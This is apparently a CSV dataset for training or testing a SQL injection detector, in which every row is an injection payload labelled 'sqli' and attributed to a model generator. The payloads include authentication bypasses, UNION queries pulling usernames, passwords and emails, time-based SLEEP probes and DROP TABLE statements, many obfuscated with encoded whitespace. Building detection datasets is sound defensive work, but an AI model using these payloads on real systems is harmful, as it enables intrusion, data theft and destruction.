text,label,attack_type,generator
"""); DROP TABLE customers/*x*/",1,sqli,codellama
'; SELECT SLEEP(5)%23,1,sqli,codellama
"""+AND+0<1+-- ",1,sqli,codellama
""") OR 1=1 LIMIT 1-- ",1,sqli,codellama
""") OR ''='' -- -",1,sqli,codellama
')/**/AND/**/1 BETWEEN 0 AND 9/**/%23,1,sqli,codellama
"""%09AND%09''=''%09#",1,sqli,codellama
`/**/AND/**/1=2/**/%23,1,sqli,codellama
""")+AND+'a'='a'+#",1,sqli,codellama
""")	OR	'a'='a'	-- ",1,sqli,codellama
']%09AND%09'a'='a'%09/*x*/,1,sqli,codellama
"` UNION SELECT NULL,NULL,NULL/*x*/",1,sqli,codellama
'%0d%0aAND%0d%0a''=''%0d%0a--,1,sqli,codellama
"""%0aAND%0a2>1%0a%23",1,sqli,codellama
`; DROP TABLE admin/*x*/,1,sqli,codellama
"""); SELECT SLEEP(5)-- -",1,sqli,codellama
"' UNION SELECT email,role FROM customers#",1,sqli,codellama
`/**/AND/**/2>1/**//*x*/,1,sqli,codellama
'; DROP TABLE staff/*x*/,1,sqli,codellama
"""	AND	1 BETWEEN 0 AND 9	-- -",1,sqli,codellama
']%09AND%09'a'='a'%09--,1,sqli,codellama
') OR 1=1 LIMIT 1%23,1,sqli,codellama
']%0d%0aAND%0d%0a''=''%0d%0a--,1,sqli,codellama
' AND 0<1 --,1,sqli,codellama
"') AND extractvalue(1,concat(0x7e,(SELECT status FROM admin LIMIT 1)))",1,sqli,codellama
"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a--",1,sqli,codellama
""" UNION SELECT last_name,username,role,status FROM sessions/*x*/",1,sqli,codellama
` AND ''='' #,1,sqli,codellama
`+OR+1 BETWEEN 0 AND 9+%23,1,sqli,codellama
`+OR+1=2+-- -,1,sqli,codellama
""")	AND	2>1	-- -",1,sqli,codellama
`; DROP TABLE credentials#,1,sqli,codellama
"'] UNION SELECT user,last_name FROM users#",1,sqli,codellama
`%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/,1,sqli,codellama
' AND 2>1 -- -,1,sqli,codellama
""")%09OR%09'a'='a'%09--",1,sqli,codellama
`; DROP TABLE tokens/*x*/,1,sqli,codellama
'] OR 1=1 LIMIT 1#,1,sqli,codellama
'; DROP TABLE admin--,1,sqli,codellama
"` UNION SELECT username,pwd,status,account,last_name,id FROM admin--",1,sqli,codellama
""" AND ''='' #",1,sqli,codellama
"""); SELECT SLEEP(5)%23",1,sqli,codellama
"` UNION SELECT username,pwd,account,status FROM accounts#",1,sqli,codellama
""")%0aOR%0a2>1%0a#",1,sqli,codellama
'/**/OR/**/'a'='a'/**/-- ,1,sqli,codellama
'	OR	''=''	--,1,sqli,codellama
'%0aOR%0a1 LIKE 1%0a-- -,1,sqli,codellama
'] AND (SELECT COUNT(*) FROM credentials)>0%23,1,sqli,codellama
"""%0aAND%0a'a'='a'%0a#",1,sqli,codellama
"""	AND	'a'='a'	-- ",1,sqli,codellama
']%0aOR%0a1=2%0a-- -,1,sqli,codellama
""")%0aOR%0a'a'='a'%0a-- ",1,sqli,codellama
']%0d%0aOR%0d%0a1=1%0d%0a-- ,1,sqli,codellama
""") AND 1=2 #",1,sqli,codellama
"' AND extractvalue(1,concat(0x7e,(SELECT account FROM admin LIMIT 1)))",1,sqli,codellama
`%09OR%091 LIKE 1%09--,1,sqli,codellama
`; SELECT SLEEP(5)--,1,sqli,codellama
"""%0d%0aAND%0d%0a1 LIKE 1%0d%0a%23",1,sqli,codellama
'/**/OR/**/1 LIKE 1/**/-- ,1,sqli,codellama
'/**/OR/**/''=''/**/--,1,sqli,codellama
']/**/AND/**/2>1/**//*x*/,1,sqli,codellama
"""	OR	2>1	-- ",1,sqli,codellama
"""%09OR%092>1%09--",1,sqli,codellama
""") UNION SELECT uid,role FROM sessions-- -",1,sqli,codellama
'/**/AND/**/1=2/**/--,1,sqli,codellama
""") OR 1=1 LIMIT 1/*x*/",1,sqli,codellama
"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a%23",1,sqli,codellama
') OR 1=1 LIMIT 1--,1,sqli,codellama
`%0aAND%0a1 BETWEEN 0 AND 9%0a-- ,1,sqli,codellama
""")/**/AND/**/1 LIKE 1/**/--",1,sqli,codellama
""") OR ''='' -- ",1,sqli,codellama
')%0aOR%0a1 LIKE 1%0a#,1,sqli,codellama
')	AND	1 LIKE 1	#,1,sqli,codellama
""" AND 2>1 %23",1,sqli,codellama
""") UNION SELECT email FROM accounts%23",1,sqli,codellama
""")/**/OR/**/1 LIKE 1/**/--",1,sqli,codellama
`+OR+0<1+-- ,1,sqli,codellama
"""/**/AND/**/1=1/**/--",1,sqli,codellama
')%0d%0aOR%0d%0a1 BETWEEN 0 AND 9%0d%0a-- ,1,sqli,codellama
""") AND 1 LIKE 1 -- ",1,sqli,codellama
']+OR+0<1+/*x*/,1,sqli,codellama
' OR 1=2 /*x*/,1,sqli,codellama
""")%09OR%091 BETWEEN 0 AND 9%09--",1,sqli,codellama
')%0aAND%0a1 BETWEEN 0 AND 9%0a--,1,sqli,codellama
`	OR	1=2	--,1,sqli,codellama
'%09AND%092>1%09%23,1,sqli,codellama
']/**/OR/**/1 LIKE 1/**/-- ,1,sqli,codellama
') AND (SELECT COUNT(*) FROM credentials)>0--,1,sqli,codellama
']	OR	''=''	/*x*/,1,sqli,codellama
' AND 1=1 --,1,sqli,codellama
')+OR+2>1+#,1,sqli,codellama
'%0d%0aOR%0d%0a''=''%0d%0a#,1,sqli,codellama
""")%0aAND%0a''=''%0a%23",1,sqli,codellama
`/**/OR/**/''=''/**/-- ,1,sqli,codellama
` OR 1=1 LIMIT 1/*x*/,1,sqli,codellama
'%0d%0aAND%0d%0a1=1%0d%0a-- ,1,sqli,codellama
""" OR 1=1 LIMIT 1--",1,sqli,codellama
' AND 1 BETWEEN 0 AND 9 #,1,sqli,codellama
"""%0d%0aOR%0d%0a''=''%0d%0a--",1,sqli,codellama
`%09AND%091 LIKE 1%09/*x*/,1,sqli,codellama
""" AND 1 BETWEEN 0 AND 9 /*x*/",1,sqli,codellama
'] AND 1=2 --,1,sqli,codellama
""") UNION SELECT NULL,NULL,NULL,NULL-- -",1,sqli,codellama
""" OR 'a'='a' -- -",1,sqli,codellama
`%0d%0aOR%0d%0a0<1%0d%0a/*x*/,1,sqli,codellama
']; SELECT SLEEP(5)-- ,1,sqli,codellama
')	OR	1=1	#,1,sqli,codellama
' OR 1=1 LIMIT 1%23,1,sqli,codellama
""")/**/OR/**/2>1/**/-- ",1,sqli,codellama
""" AND 0<1 #",1,sqli,codellama
""" OR 1=1 LIMIT 1-- ",1,sqli,codellama
""") OR 1=1 LIMIT 1-- -",1,sqli,codellama
') OR 1=1 -- -,1,sqli,codellama
'; SELECT SLEEP(5)/*x*/,1,sqli,codellama
']%0d%0aOR%0d%0a1=2%0d%0a-- -,1,sqli,codellama
')%0d%0aAND%0d%0a1=2%0d%0a-- ,1,sqli,codellama
""")+OR+1 LIKE 1+%23",1,sqli,codellama
""" AND (SELECT COUNT(*) FROM sessions)>0#",1,sqli,codellama
' AND 1=2 %23,1,sqli,codellama
')	OR	'a'='a'	-- -,1,sqli,codellama
')+OR+0<1+-- -,1,sqli,codellama
`%0d%0aAND%0d%0a1=2%0d%0a#,1,sqli,codellama
')%0aOR%0a1=1%0a#,1,sqli,codellama
""") UNION SELECT account,uid,id FROM admin-- ",1,sqli,codellama
' OR 'a'='a' --,1,sqli,codellama
')	OR	1 LIKE 1	-- -,1,sqli,codellama
""" AND (SELECT COUNT(*) FROM staff)>0/*x*/",1,sqli,codellama
`%09OR%092>1%09%23,1,sqli,codellama
']+AND+1 LIKE 1+#,1,sqli,codellama
